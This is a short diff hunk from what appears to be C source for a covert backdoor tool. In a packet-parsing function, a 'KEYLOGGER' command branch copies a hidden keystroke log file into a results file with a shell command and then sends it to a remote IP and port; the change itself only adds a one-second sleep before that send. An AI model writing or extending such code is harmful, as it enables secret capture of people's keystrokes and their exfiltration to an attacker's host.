@@ -185,6 +185,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                     printf("KEYLOGGER\n");
                     //copy keylogger file to results file
                     system("cat .keylogger.txt > .results");
+                    sleep(1);
                     send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
                 }
                 break;
